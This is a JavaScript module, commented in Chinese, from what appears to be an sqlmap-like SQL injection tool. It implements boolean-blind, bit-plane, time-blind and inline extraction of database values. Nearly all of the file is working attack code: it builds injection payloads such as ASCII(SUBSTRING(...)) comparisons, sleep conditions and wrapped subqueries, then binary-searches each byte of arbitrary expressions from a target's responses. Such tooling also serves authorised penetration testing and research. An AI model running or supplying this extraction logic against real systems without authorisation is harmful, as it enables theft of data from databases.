// ============================================================================
// blindExtractor.js —— 盲注 / 时间 / 内联 字节级提取子系统
//
// 从 Extractor.js 整段抽出（2026-09-14 大文件拆分）。**纯搬移，行为不变**：
// 方法体逐行等价，唯一的机械变换是 this → ex（实例改为首参传入），
// Extractor 上保留同名薄包装，故既有调用方与测试零改动（测试直连 extractBoolean/extractTime
// 共 45+ 处，正是这个包装保住的）。
//
// 为什么整段搬：这 520 行是一个自成一体的子系统（长度二分 → 多字符并行二分 → 整值复验
// → 时间通道校准），内部方法互相调用，与外部只剩 ex._send / ex._extractCache 两个接触点。
// ============================================================================
import { defaults } from '../config/defaults.js';
import { resolveDbms, resolveFromClause, WRAP } from './DialectSqlBuilder.js';
import {
  LEN_FN, SUB_FN, ASCII_FN, VERSION_EXPR, TIME_COND,
} from './extractionMaps.js';
import { buildDynamicSimilarFn } from './Detector.js';

  // ===== 盲注二分提取（兜底） =====

  // 盲注二分提取单个表达式字符串：长度二分 + 多字符并行二分（并发度 extractConcurrency）
/** @param {any} ex @param {object} ctx @param {any} expr */
export async function extractBoolean(ex, ctx, expr) {
    const dbms = resolveDbms(ctx.dbms || 'MySQL');
    // boundary 感知：闭合前缀拼进 base，确保提取阶段的 payload 与检测阶段同构闭合
    const base = `${ctx.point.originalValue || '1'}${ctx.point.boundary || ''}`;
    // 结果缓存（对标 --predict-output）：按目标 + scanId 维度隔离，跨注入点复用常见值。
    // 开关 config.predictOutput（默认 true）；关闭时跳过缓存，每次完整二分。
    const predictOutput = ctx.config?.predictOutput !== false && defaults.predictOutput !== false;
    const scanId = ctx.scanId || ctx.target?.scanId || '';
    const cacheKey = `${scanId}:${dbms}:${expr}`;
    const targetCache = ex._extractCache.get(ctx.target);
    if (predictOutput && targetCache && targetCache.has(cacheKey)) return targetCache.get(cacheKey);
    const lenFn = LEN_FN[dbms] || LEN_FN.MySQL;
    const subFn = SUB_FN[dbms] || SUB_FN.MySQL;
    const asciiFn = ASCII_FN[dbms] || ASCII_FN.MySQL;

    // [P2-FIX 长度上界] 撞 255 上界时探测长值延伸（短值零额外请求）
    let len = await _binarySearch(ex, ctx, base, (cmp) =>
      `(${lenFn(expr)})${cmp}`
    );
    if (len >= 255) {
      len = await _extendLength(ex, ctx, base, lenFn(expr), len);
    }
    if (len <= 0) return null;

    // 多字符并行二分：每轮并发探测 K 个位置，false 基准整批共用，提速约 K 倍。
    // 字节级提取：ASCII(SUBSTRING(...)) 取该位置首字节码值(0–255)，覆盖中文等多字节字符；
    // 全部字节收集后由 TextDecoder('utf-8') 统一还原，避免原 code>=32&&<=126 把非 ASCII 截断为空。
    const K = ctx.config?.extractConcurrency || 4;
    // P2-P2 二次确认：每字节收敛后发 1 次等值验证请求（判定与主二分完全一致：
    // 响应 ≠ false 基准即「条件为真」→ 字节等于候选值）。验证不一致 → 回退重测该字节
    // （重置二分状态重新收敛，最多 2 次），提升抖动目标上的提取准确性。
    // 开关 config.blindRobust.extractVerify（默认 true）；关闭时零额外请求（与旧行为一致）。
    // 注：mock oracle 等确定性目标对等值探测返回与主判定一致的结果，重测收敛到同一值，幂等。
    const rbCfg = ctx.config?.blindRobust;
    const extractVerify = rbCfg ? rbCfg.extractVerify !== false : defaults.blindRobust.extractVerify !== false;
    const bytes = new Array(len).fill(0);

    // [批次 11 2026-09-15] 位平面提取（opt-in config.blindBitwise === true，默认关零回归）：
    // BIT_COUNT(CONV(HEX(SUBSTRING(expr,pos,1)),16,10) & mask) 非 0 ⇔ 字节第 bit 位为 1。
    // 8 位并行 → 每字符 1 轮请求（二分 ~8 轮 / 字符类 ~5 轮）。仅 MySQL/TiDB 族启用；
    // 判定复用 _dynJudge 通道；8 位收敛后整体等值验证（复用 extractVerify 语义），
    // 任一字符验证失败 → 整体放弃位平面结果、落回下方原二分路径（保守，零漏提取）。
    if (ctx.config?.blindBitwise === true && /^(MySQL|MariaDB|TiDB)$/i.test(resolveDbms(ctx.dbms || 'MySQL'))) {
      const judgeB = _dynJudge(ex, ctx);
      const bytesB = new Array(len).fill(0);
      let bitsValid = true;
      outer: for (let bit = 0; bit < 8 && bitsValid; bit++) {
        const mask = 1 << bit;
        let remainingBits = Array.from({ length: len }, (_, i) => i + 1);
        const errBits = new Array(len + 1).fill(0);
        while (remainingBits.length) {
          const batchPos = remainingBits.splice(0, K);
          const reqs = batchPos.map((pos) =>
            `${base} AND BIT_COUNT(CONV(HEX(SUBSTRING(${expr},${pos},1)),16,10) & ${mask})-- -`
          );
          reqs.push(`${base} AND (1=2)-- -`);
          const resps = await _sendBatch(ex, ctx, reqs);
          const falseResp2 = resps[resps.length - 1];
          if (!falseResp2) {
            for (const pos of batchPos) {
              errBits[pos] += 1;
              if (errBits[pos] <= 3) remainingBits.push(pos);
              else { bitsValid = false; break outer; }
            }
            continue;
          }
          judgeB.observe(String(falseResp2?.data ?? ''));
          const falseData2 = String(falseResp2?.data ?? '');
          for (let kk = 0; kk < batchPos.length; kk++) {
            const pos = batchPos[kk];
            const resp = resps[kk];
            if (!resp) {
              errBits[pos] += 1;
              if (errBits[pos] <= 3) remainingBits.push(pos);
              else { bitsValid = false; break outer; }
              continue;
            }
            if (String(resp?.data ?? '') !== falseData2) bytesB[pos - 1] |= mask;
          }
        }
      }
      if (bitsValid) {
        // 整体等值验证（extractVerify 语义）：每字符 1 次确认，失败即整体回退原路径
        if (extractVerify) {
          for (let i = 1; i <= len && bitsValid; i++) {
            const v = bytesB[i - 1];
            const resps = await _sendBatch(ex, ctx, [
              `${base} AND (${asciiFn(subFn(expr, i))}=${v})-- -`,
              `${base} AND (1=2)-- -`,
            ]);
            const fd = String(resps[1]?.data ?? '');
            if (!resps[0] || String(resps[0]?.data ?? '') === fd) bitsValid = false;
          }
        }
        if (bitsValid) {
          const decodedB = new TextDecoder('utf-8').decode(new Uint8Array(bytesB));
          if (ctx) ctx.extractConfidence = ctx.extractConfidence || 'normal';
          return decodedB; // 位平面成功：跳过下方原二分路径（请求量 ~1/8）
        }
        // 回退：重置字节数组，走下方原二分全路径
        bytes.fill(0);
      }
    }
    // [P0-FIX] 动态块感知真值判定（详见 _dynJudge）：收集批内 false 基准做基线
    const judge = _dynJudge(ex, ctx);
    let anyAbandoned = false; // 有字节因重试超限被放弃 → 最终值标低置信
    // [B-perf] 字符集收窄（对标 sqlmap --charset 思路）：每位置先发 1-2 次字符类探测——
    //   ① ASCII(SUBSTRING(expr,pos,1)) BETWEEN 48 AND 57（数字）→ 命中则二分区间收窄到 [48,57]
    //     （8 轮 → 3-4 轮，数字场景每字符 8 → 5 请求）；
    //   ② 未命中再试小写字母区间 [97,122]（字母场景 8 → ~7 请求）；
    //   ③ 都未命中回退全区间 [0,255]（最坏 +2 请求，收敛语义与全区间完全一致）。
    // 判定与主二分同通道（响应 ≠ false 基准即真），确定性目标下收敛结果与全区间二分一致；
    // 若类探测被目标抖动污染，收敛值会越界 → extractVerify 等值验证失败 → 回退全区间重测
    // （重测跳过类探测，直接全区间二分，与旧行为一致），无回归。
    /** @type {Array<{ pos: number; lo: number; hi: number; phase: string; _mid?: number; _err?: any; _retries?: number }>} */
    const st = Array.from({ length: len }, (_, i) => ({
      pos: i + 1,
      lo: 0,
      hi: 255,
      phase: 'cls-digits', // cls-digits → cls-lower → bisect
      // _mid / _err / _retries 由下方批处理循环按需填充（非必填，不改变既有行为）
    }));
    let remaining = st.slice(); // 未完成（未收敛）位置；每轮取前 K 个并发探测，未收敛的回插队尾
    while (remaining.length) {
      const batch = remaining.splice(0, K);
      const reqs = batch.map((s) => {
        if (s.phase === 'cls-digits' || s.phase === 'cls-lower') {
          const [a, b] = s.phase === 'cls-digits' ? [48, 57] : [97, 122];
          return `${base} AND (${asciiFn(subFn(expr, s.pos))} BETWEEN ${a} AND ${b})-- -`;
        }
        const mid = Math.floor((s.lo + s.hi) / 2);
        s._mid = mid;
        return `${base} AND (${asciiFn(subFn(expr, s.pos))}>${mid})-- -`;
      });
      reqs.push(`${base} AND (1=2)-- -`); // 整批共用的 false 基准
      const resps = await _sendBatch(ex, ctx, reqs);
      const falseResp = resps[resps.length - 1];
      // ★FIX-1 [P1] 原实现把「请求失败（网络错误/超时，_send 返回 null）」当空串参与比较：
      //   ① 真条件请求失败 → trueData='' ≠ falseData → 误判「条件为真」；
      //   ② 假基准请求失败 → falseData='' → 批内所有真条件都「成立」。
      // 两者都会把错误字节写进结果（且 _send 对超时也返回 null，慢目标上极易触发）。
      // 修复：失败即「不可判定」——位置回插队尾重试（≤ MAX_PROBE_ERR 次），超限放弃该
      // 字节(置 0)防死循环（确定性目标幂等，重测收敛到同一值）。
      const MAX_PROBE_ERR = 3;
      if (!falseResp) {
        for (const s of batch) {
          s._err = (s._err || 0) + 1;
          if (s._err <= MAX_PROBE_ERR) remaining.push(s);
          else {
            bytes[s.pos - 1] = 0x3f; // '?'：放弃字节不再落 0x00（NUL 会原样混入提取值）
            anyAbandoned = true;
          }
        }
        continue;
      }
      // [P0-FIX] false 基准即基线样本：喂给动态块判定器
      judge.observe(falseResp?.data);
      const falseData = String(falseResp?.data ?? '');
      for (let k = 0; k < batch.length; k++) {
        const s = batch[k];
        const resp = resps[k];
        if (!resp) {
          s._err = (s._err || 0) + 1;
          if (s._err <= MAX_PROBE_ERR) remaining.push(s);
          else {
            bytes[s.pos - 1] = 0x3f; // '?'：放弃字节不再落 0x00（NUL 会原样混入提取值）
            anyAbandoned = true;
          }
          continue;
        }
        // [P0-FIX] 判定走动态块感知通道：动态页下「与 false 基准仅动态块差异」不再误判为真
        const ok = judge.truthy(resp, falseData);
        // —— 字符类探测阶段（charset 收窄）：命中则收窄区间，未命中试下一类 / 回退全区间 ——
        if (s.phase === 'cls-digits' || s.phase === 'cls-lower') {
          if (ok) {
            const [a, b] = s.phase === 'cls-digits' ? [48, 57] : [97, 122];
            s.lo = a;
            s.hi = b;
            s.phase = 'bisect';
          } else if (s.phase === 'cls-digits') {
            s.phase = 'cls-lower'; // 数字未命中 → 试小写字母区间
          } else {
            s.phase = 'bisect'; // 两类都未命中 → 回退全区间 [0,255]（原行为）
          }
          remaining.push(s); // 类探测后未收敛，回插队尾继续二分
          continue;
        }
        // —— 二分阶段（原逻辑不变）——
        const midNow = /** @type {number} */ (s._mid); // 本批请求前已赋值（见上方 s._mid = mid）
        if (ok) s.lo = midNow + 1;
        else s.hi = midNow - 1;
        if (s.lo > s.hi) {
          const candidate = s.hi + 1; // 收敛出的单字节码值（0–255）
          if (extractVerify) {
            // 等值验证：ASCII(SUBSTRING(expr,pos,1)) = candidate 应为真（响应偏离 false 基准）
            const verifyResp = await ex._send(
              ctx,
              `${base} AND (${asciiFn(subFn(expr, s.pos))}=${candidate})-- -`
            );
            // [P0-FIX] 验证判定同样走动态块感知通道（与主二分判定完全一致）
            const verified = judge.truthy(verifyResp, falseData);
            if (!verified) {
              const retried = (s._retries = (s._retries || 0) + 1);
              if (retried <= 2) {
                // 回退重测：重置该字节二分状态，重新收敛（最多 2 次）。
                // [B-perf] 直接回退全区间并跳过类探测（等值验证失败常因类探测被抖动污染，
                // 重放同样的类探测可能再次命中同一污染 → 再错一次；全区间二分 = 旧行为）。
                s.lo = 0;
                s.hi = 255;
                s.phase = 'bisect';
                remaining.push(s);
                continue;
              }
              // 达到重试上限，接受当前二分值（防死循环；确定性目标幂等）
            }
          }
          bytes[s.pos - 1] = candidate;
        } else {
          remaining.push(s); // 未收敛，回插队尾等待下一轮继续二分
        }
      }
    }
    // 字节数组整体按 UTF-8 解码，多字节字符（中文/emoji）正确还原
    const result = new TextDecoder('utf-8').decode(Uint8Array.from(bytes));
    // [P0-FIX] NUL 污染修复收尾：有放弃字节（'?' 占位）时标记低置信，
    // 调用方（ScanManager/报告）据此注明提取结果可信度，不再静默输出被 NUL 污染的值
    if (anyAbandoned && ctx) ctx.extractConfidence = 'low';
    // P2-P7 完整值投票复验（对标 sqlmap 对关键提取值重测确认）：提取完成后对「完整值」发 1 次
    // 整体等值复验（布尔条件 (expr)='<完整值>' 直接比对），判定与主二分一致（响应 ≠ false 基准即真）。
    // 仅 1 次额外请求（不逐字符重测）；失败不丢弃值、不重测，仅标记 ctx.extractConfidence='low'
    // 供调用方在结果上注明（低置信，可能偶发误判）。开关复用 blindRobust.extractVerify（默认 true）。
    if (extractVerify && result !== null && result !== '') {
      const verified = await _verifyWholeValue(ex, ctx, base, expr, result);
      if (!verified && ctx) ctx.extractConfidence = 'low';
    }
    // 写缓存（null/空串不缓存，避免固化「提取失败」；成功结果按目标 + scanId 维度隔离复用）
    if (predictOutput && result !== null && result !== '') {
      const tc = ex._extractCache.get(ctx.target) || new Map();
      tc.set(cacheKey, result);
      ex._extractCache.set(ctx.target, tc);
    }
    return result;
  }

  // 限并发发送一批注入值，保持顺序返回（单请求失败返回 null，不中断整体）
/** @param {any} ex @param {object} ctx @param {any} values */
async function _sendBatch(ex, ctx, values) {
    const K = ctx.config?.extractConcurrency || 4;
    const out = new Array(values.length);
    let cursor = 0;
    const worker = async () => {
      while (cursor < values.length) {
        const i = cursor++;
        out[i] = await ex._send(ctx, values[i]);
      }
    };
    const n = Math.max(1, Math.min(K, values.length));
    await Promise.all(Array.from({ length: n }, () => worker()));
    return out;
  }

  // =====================================================================
  // [P0-FIX] 提取阶段真值判定：复用检测层 autoDynamicBlock（动态块排除）
  // 原实现布尔/长度二分对探测响应只做 `data !== falseData` 严格不等比较。
  // 动态页（时间戳/广告/随机推荐块）目标下，每个探测响应都 ≠ false 基准 →
  // 所有条件恒判「真」→ 提取值全错（r3 复审遗留高影响项）。
  // 修复：收集批内 false 基准响应体（≤3 条去重）作为基线样本，凑齐 ≥2 条后用与
  // Detector.buildDynamicSimilar 完全相同的构建器生成「排除动态块的相似判定」；
  // 判定语义：探测响应与任一 false 基准「动态块排除后相似」→ 判「假」，否则判「真」。
  // autoDynamicBlock 显式关闭（config.autoDynamicBlock === false）时回退严格不等
  // 比较（与旧行为一致，零回归）。
  // =====================================================================
/** @param {any} ex @param {object} ctx */
function _dynJudge(ex, ctx) {
    const config = (ctx && ctx.config) || {};
    const enabled =
      config.autoDynamicBlock !== false && (ctx ? defaults.autoDynamicBlock !== false : true);
    const baselines = [];
    let similar; // undefined=未构建；null=已构建但无动态块（回退严格比较）；function=可用
    const ensureSimilar = () => {
      if (!enabled || similar !== undefined || baselines.length < 2) return similar ?? null;
      similar = buildDynamicSimilarFn(baselines);
      return similar;
    };
    return {
      /** 每批探测后记录一次 false 基准响应体（去重，≤3 条） */
      observe(data) {
        const s = String(data ?? '');
        if (baselines.length < 3 && !baselines.includes(s)) {
          baselines.push(s);
          ensureSimilar();
        }
      },
      /** true=条件成立（响应偏离 false 基准）；false=与基准一致 */
      truthy(resp, falseData) {
        const data = String(resp?.data ?? '');
        const sim = ensureSimilar();
        if (sim) {
          // 与任一 false 基准「动态块排除后相似」→ 判假；都不相似 → 判真
          return !baselines.some((b) => sim(data, b));
        }
        return data !== String(falseData ?? '');
      },
    };
  }

  // 通用二分：并发发「真条件 + false 基准」两请求，返回使条件成立的最大值+1（默认 0..255）
  // [P0-FIX] 判定接入 autoDynamicBlock（与 extractBoolean 同通道）：动态页下长度二分
  // 原先恒判「真」（长度上界一路打到 255）→ 长度错误导致整条提取失败
  // [P2-FIX 长度上界] range={lo,hi} 支持延伸区间（长度 >255 的长值续段二分，见 _extendLength）
/** @param {any} ex @param {object} ctx @param {any} base @param {any} makeCond @param {any} range */
async function _binarySearch(ex, ctx, base, makeCond, range = {}) {
    const judge = _dynJudge(ex, ctx);
    const test = async (cmp) => {
      const [rTrue, rFalse] = await _sendBatch(ex, ctx, [
        `${base} AND (${makeCond(cmp)})-- -`,
        `${base} AND (1=2)-- -`,
      ]);
      if (rFalse) judge.observe(rFalse?.data);
      return judge.truthy(rTrue, rFalse?.data);
    };
    let lo = range.lo ?? 0;
    let hi = range.hi ?? 255;
    let found = -1;
    while (lo <= hi) {
      const mid = Math.floor((lo + hi) / 2);
      const ok = await test(`>${mid}`);
      if (ok) {
        found = mid;
        lo = mid + 1;
      } else {
        hi = mid - 1;
      }
    }
    return found + 1;
  }

  // [P2-FIX 长度上界延伸] 长度二分撞到 255 上界时，探测真实长度是否 >255（原实现静默截断）：
  // 短值（<255，绝大多数场景）零额外请求；确为长值则在 [256, blindMaxLen] 续段二分。
  // blindMaxLen 可配（config.blindMaxLen，默认 65535），防超长值无限拉取。
/** @param {any} ex @param {object} ctx @param {any} base @param {any} lenExpr @param {any} current */
async function _extendLength(ex, ctx, base, lenExpr, current) {
    const maxLen = Number(ctx?.config?.blindMaxLen) > 255 ? Math.floor(ctx.config.blindMaxLen) : 65535;
    if (current < 255 || maxLen <= 255) return current;
    const judge = _dynJudge(ex, ctx);
    const [rTrue, rFalse] = await _sendBatch(ex, ctx, [
      `${base} AND (${lenExpr}>255)-- -`,
      `${base} AND (1=2)-- -`,
    ]);
    if (rFalse) judge.observe(rFalse?.data);
    if (!judge.truthy(rTrue, rFalse?.data)) return current; // 真实长度恰为 255
    const ext = await _binarySearch(ex, ctx, base, (cmp) => `(${lenExpr})${cmp}`, { lo: 256, hi: maxLen });
    // 真实长度 ≥ maxLen 时二分会溢出返回 maxLen+1 → 钳位（提取前 maxLen 字节）
    return Math.min(ext, maxLen);
  }

  // 盲注提取版本证明（供 ScanManager 在布尔/时间注入点调用）
/** @param {any} ex @param {object} ctx */
export async function extractProof(ex, ctx) {
    const expr = VERSION_EXPR[resolveDbms(ctx.dbms)];
    if (!expr) return null;
    return extractBoolean(ex, ctx, expr);
  }

  // 时间盲注提取版本证明（供 ScanManager 在 time 注入点调用，路由到时间通道）。
  // SQL Server（需堆叠 WAITFOR）与 SQLite（无原生 sleep）无标量延迟原语，返回 null → 降级布尔通道。
/** @param {any} ex @param {object} ctx */
export async function extractTimeProof(ex, ctx) {
    const expr = VERSION_EXPR[resolveDbms(ctx.dbms)];
    if (!expr) return null;
    return extractTime(ex, ctx, expr);
  }

  // 时间盲注二分提取：与 extractBoolean 同构，但判定从「响应差异」改为「响应耗时 ≥ 阈值」。
  // 判定函数：注入 TIME_COND 条件延迟表达式，条件为真 → sleep 3s → 耗时高即判定为真。
  // 仅支持 MySQL / PostgreSQL / Oracle / ClickHouse / H2 / MonetDB（含 MariaDB/TiDB 复用 MySQL、DM8 复用 Oracle）；
  // SQL Server / Sybase / SQLite 无标量条件延迟原语，返回 null（诚实降级布尔通道）。
  // [P1] DB2/Firebird/Informix/Access/HSQLDB/Derby 同样无标量延时原语 → null（降级布尔通道）。
/** @param {any} ex @param {object} ctx @param {any} expr */
export async function extractTime(ex, ctx, expr) {
    const dbms = resolveDbms(ctx.dbms || 'MySQL');
    const condFn = TIME_COND[dbms];
    if (!condFn) return null;
    // [P0-FIX] 预测输出缓存（对标 --predict-output）：时间盲注复用常见值缓存，消除同目标
    // 多注入点重复提取。key 结构与 extractBoolean 一致（scanId:dbms:expr），命中直接返回。
    const predictOutput = ctx.config?.predictOutput !== false && defaults.predictOutput !== false;
    const scanId = ctx.scanId || ctx.target?.scanId || '';
    const cacheKey = `${scanId}:${dbms}:${expr}`;
    const targetCache = ex._extractCache.get(ctx.target);
    if (predictOutput && targetCache && targetCache.has(cacheKey)) return targetCache.get(cacheKey);
    // boundary 感知：闭合前缀拼进 base
    const base = `${ctx.point.originalValue || '1'}${ctx.point.boundary || ''}`;
    const lenFn = LEN_FN[dbms] || LEN_FN.MySQL;
    const subFn = SUB_FN[dbms] || SUB_FN.MySQL;
    const asciiFn = ASCII_FN[dbms] || ASCII_FN.MySQL;
    // 时间判定阈值：以「基线耗时 + timeThresholdMs」为准，避免目标本身慢造成误判
    const thresholdMs = (ctx.config?.timeThresholdMs ?? defaults.timeThresholdMs) * 1;
    // 完整值投票复验开关（P2-P7，与布尔通道共用 blindRobust.extractVerify，默认 true）
    const rbCfg = ctx.config?.blindRobust;
    const extractVerify = rbCfg ? rbCfg.extractVerify !== false : defaults.blindRobust.extractVerify !== false;
    // 提取阶段 sleep（P2-P8）：timeExtractSleepSec 优先，未配置回退 timeBlindSleepSec（与现状一致）
    const sleepSec = await calibrateTimeSleep(ex, ctx, base, condFn);
    const timeoutMs = (ctx.config?.timeoutMs ?? defaults.timeoutMs) + sleepSec * 1000;

    // 时间判定：条件为真 → 触发延迟 → 耗时 ≥ 阈值
    const timedTrue = async (cond) => {
      const payload = `${base} AND ${condFn(cond, sleepSec)}-- -`;
      const t0 = Date.now();
      // ★FIX-2 [P1] 原实现把「请求失败（含 axios 超时，_send 返回 null）」吞掉后仍按耗时
      // 判定：一旦请求超时，elapsed≈timeoutMs≥threshold → 恒判「条件为真」，网络抖动会
      // 污染整条时间提取链（逐字节 8 次判定全偏）。修复：失败重试一次；仍失败按
      // 「不可判定=假」处理（宁漏不误，避免错误字节）。
      let res = await ex._send(ctx, payload, { timeoutMs });
      if (!res) res = await ex._send(ctx, payload, { timeoutMs });
      if (!res) return false;
      return Date.now() - t0 >= thresholdMs;
    };

    // 长度二分（同 extractBoolean 的 _binarySearch，但用时间判定）
    let len = await _timeBinarySearch(ex, ctx, base, (cmp) => `(${lenFn(expr)})${cmp}`, timedTrue);
    // [P2-FIX 长度上界] 时间通道同样延伸：撞 255 上界时探测真实长度是否 >255（时间判定成本 1 请求）
    if (len >= 255) {
      const maxLen = Number(ctx?.config?.blindMaxLen) > 255 ? Math.floor(ctx.config.blindMaxLen) : 65535;
      if (maxLen > 255 && (await timedTrue(`(${lenFn(expr)})>255`))) {
        const ext = await _timeBinarySearch(ex, ctx, base, (cmp) => `(${lenFn(expr)})${cmp}`, timedTrue, { lo: 256, hi: maxLen });
        // 真实长度 ≥ maxLen 时钳位（提取前 maxLen 字节）
        len = Math.min(ext, maxLen);
      }
    }
    if (len <= 0) return null;

    // 逐字节二分（时间判定串行，无法像布尔那样多位置并行——并发 sleep 会互相污染耗时判定）
    // [B-perf 收尾] 时间通道数字字符集收窄（与布尔通道同思路，对标 --charset）：时间通道每请求
    // 真实 sleep、成本远高于布尔通道，数字区间命中则 [48,57] 二分（8 → ~6 探测/字符）。
    // 仅当 extractVerify 开启时启用——收窄正确性依赖逐字节等值验证自愈（类探测被网络抖动
    // 污染 → 收敛越界 → 等值验证失败 → 回退全区间重测）；验证失败或类未命中都回到旧路径
    // （全区间 8 轮二分），收敛语义与原实现完全一致。小写字母区间在时间通道无净收益
    // （2 次类探测 + ~5 轮二分 ≈ 全区间 8 探测），不做。
    const bisectPos = async (pos, lo, hi) => {
      let l = lo;
      let h = hi;
      while (l <= h) {
        const mid = Math.floor((l + h) / 2);
        const ok = await timedTrue(`(${asciiFn(subFn(expr, pos))}>${mid})`);
        if (ok) l = mid + 1;
        else h = mid - 1;
      }
      // 收敛值 = h+1（与布尔通道 candidate = s.hi+1 同约定）：全 false 时 h=lo-1 → 返回 lo
      //（字节=区间下界；原全区间写法 found+1 在 lo>0 的收窄区间会把下界值误判为 0）
      return h + 1;
    };
    const bytes = new Array(len).fill(0);
    for (let pos = 1; pos <= len; pos++) {
      let byteVal = -1;
      if (extractVerify && (await timedTrue(`(${asciiFn(subFn(expr, pos))} BETWEEN 48 AND 57)`))) {
        const cand = await bisectPos(pos, 48, 57);
        // 等值验证：命中数字类但收敛值验证失败 → 判定类探测被污染，回退全区间重测
        const verified = await timedTrue(`(${asciiFn(subFn(expr, pos))}=${cand})`);
        if (verified) byteVal = cand;
      }
      if (byteVal < 0) byteVal = await bisectPos(pos, 0, 255);
      bytes[pos - 1] = byteVal;
    }
    const result = new TextDecoder('utf-8').decode(Uint8Array.from(bytes));
    // [P0-FIX] 写入预测输出缓存（与 extractBoolean 共享 _extractCache），供后续同目标
    // 多注入点复用，避免每个点都重新 sleep 二分提取相同表达式（如 version()）。
    if (predictOutput && result !== null && result !== '') {
      if (!ex._extractCache.has(ctx.target)) ex._extractCache.set(ctx.target, new Map());
      ex._extractCache.get(ctx.target).set(cacheKey, result);
    }
    // P2-P7 完整值投票复验：提取完成后对完整值发 1 次整体等值复验（时间判定，
    // 条件为真 → 触发延迟）。仅 1 次额外请求；失败不重测，仅标记低置信供调用方注明。
    if (extractVerify && result !== null && result !== '') {
      const escaped = String(result).replace(/'/g, "''");
      const verified = await timedTrue(`(${expr})='${escaped}'`);
      if (!verified && ctx) ctx.extractConfidence = 'low';
    }
    return result;
  }

  // 提取阶段 sleep（P2-P8）：timeExtractSleepSec 显式配置时用标准时长保证时间判定阈值可靠；
  // 未配置回退 timeBlindSleepSec（与现状一致，零回归）。探测阶段用 timeProbeSleepSec（见 TimeBlindDetector）。
/** @param {any} ex @param {object} ctx */
function _extractSleep(ex, ctx) {
    return ctx.config?.timeExtractSleepSec ?? ctx.config?.timeBlindSleepSec ?? defaults.timeBlindSleepSec ?? 2;
  }

  // 盲注提取完整值整体复验（P2-P7，对标 sqlmap 对关键提取值重测确认）：
  // 对提取出的「完整值」发 1 次等值复验（布尔条件 (expr)='<完整值>' 直接比对），
  // 判定与主二分完全一致：响应 ≠ false 基准即「条件为真」。仅 1 次额外请求（不逐字符重测）。
  // 失败不丢弃值、不重测（避免逐字符成本），仅标记低置信供调用方在结果上注明。
  // 值内单引号转义为双单引号，避免破坏字符串字面量。
/** @param {any} ex @param {object} ctx @param {any} base @param {any} expr @param {any} value */
async function _verifyWholeValue(ex, ctx, base, expr, value) {
    const escaped = String(value).replace(/'/g, "''");
    const [rTrue, rFalse] = await _sendBatch(ex, ctx, [
      `${base} AND (${expr})='${escaped}'-- -`,
      `${base} AND (1=2)-- -`,
    ]);
    return String(rTrue?.data ?? '') !== String(rFalse?.data ?? '');
  }

  // 时间盲注最小可行 sleep 标定（对标 sqlmap 时间盲注优化）：在正式二分提取前，
  // 用「恒真条件」实测小 sleep 的耗时能否稳定超过判定阈值。可行则取最小 sleep（降低单点墙钟），
  // 不可行逐步加大，最终回退 config.timeExtractSleepSec（未配置回退 timeBlindSleepSec，与现状一致）。
  // 开关 config.timeBlindCalibrate（opt-in，显式 true 才开启）；缺省回退 defaults.timeBlindCalibrate
  // （默认 false，与现状一致：不标定、直接用提取 sleep）。关闭时零标定请求。
  // 说明：标定仅发 1~N 个「恒真延迟」请求（N=候选数，通常 1~2），命中后每个二分请求都省下 sleep 差值，
  // 版本证明（约 7 字节 × 8 轮）可省数十秒。
/** @param {any} ex @param {object} ctx @param {any} base @param {any} condFn */
export async function calibrateTimeSleep(ex, ctx, base, condFn) {
    const cfg = ctx.config || {};
    const defaultSec = _extractSleep(ex, ctx);
    if ((cfg.timeBlindCalibrate ?? defaults.timeBlindCalibrate) !== true) return defaultSec;
    const thresholdMs = cfg.timeThresholdMs ?? defaults.timeThresholdMs ?? 1500;
    const timeoutMs = (cfg.timeoutMs ?? defaults.timeoutMs ?? 10000) + defaultSec * 1000;
    for (const sec of _sleepCandidates(ex, defaultSec)) {
      const payload = `${base} AND ${condFn('1=1', sec)}-- -`;
      const t0 = Date.now();
      await ex._send(ctx, payload, { timeoutMs });
      // 该 sleep 下恒真延迟已可判定（耗时 ≥ 阈值）→ 采用此 sleep
      if (Date.now() - t0 >= thresholdMs) return sec;
    }
    return defaultSec;
  }

  // 标定候选 sleep 列表：从 1s 递增到默认值（含），从小到大试探；默认值兜底
function _sleepCandidates(ex, defaultSec) {
    const list = [];
    for (let s = 1; s < defaultSec; s += 1) list.push(s);
    list.push(defaultSec);
    return list;
  }

  // 时间判定版的通用二分：返回使条件成立的最大值+1（默认 0..255；range 支持延伸区间）
/** @param {any} ex @param {object} ctx @param {any} base @param {any} makeCond @param {any} timedTrue @param {any} range */
async function _timeBinarySearch(ex, ctx, base, makeCond, timedTrue, range = {}) {
    let lo = range.lo ?? 0;
    let hi = range.hi ?? 255;
    let found = -1;
    while (lo <= hi) {
      const mid = Math.floor((lo + hi) / 2);
      const ok = await timedTrue(makeCond(`>${mid}`));
      if (ok) {
        found = mid;
        lo = mid + 1;
      } else {
        hi = mid - 1;
      }
    }
    return found + 1;
  }

  // 内联查询提取（对标 sqlmap Q）：把标量子查询注入值位置，期待"回显点"把结果带出响应。
  // 约束：仅对"响应可见 + 注入值能进入被回显列"的目标有效（内联技术的本质边界，详见 docs）。
  // 无回显点时返回 null，调用方应回退到 UNION / 字节级盲注通道（本工具不重建查询模板，故如此）。
/** @param {any} ex @param {object} ctx @param {any} sql */
export async function extractInline(ex, ctx, sql) {
    const dbms = resolveDbms(ctx.dbms || 'MySQL');
    const fromDual = resolveFromClause(dbms, ctx?.config?.unionFrom);
    const wrapped = (WRAP[dbms] || WRAP.MySQL)(sql); // 加 __S__/__E__ 包裹，复用既有解析
    const subq = `SELECT ${wrapped}${fromDual}`;
    const base = ctx.point.originalValue || '1';
    const isNumeric = !isNaN(Number(base));
    // 数值型：值位置直接替换为 (子查询)；字符型：用串接符拼到原值之后
    const op = dbms === 'SQL Server' ? '+' : '||';
    const payload = isNumeric ? `(${subq})` : `' ${op} (${subq}) ${op} ''`;
    const res = await ex._send(ctx, payload);
    const body = String(res?.data ?? '');
    // D6: 大小写不敏感匹配（同 extractScalar，免疫 lowercase/uppercase/mixedcase tamper）
    const m = body.match(/__S__(.*?)__E__/is);
    return m ? m[1] : null;
  }

  // 内联提取版本证明（供 ScanManager 在内联注入点调用）
/** @param {any} ex @param {object} ctx */
export async function extractInlineProof(ex, ctx) {
    const expr = VERSION_EXPR[resolveDbms(ctx.dbms)];
    if (!expr) return null;
    return extractInline(ex, ctx, expr);
  }
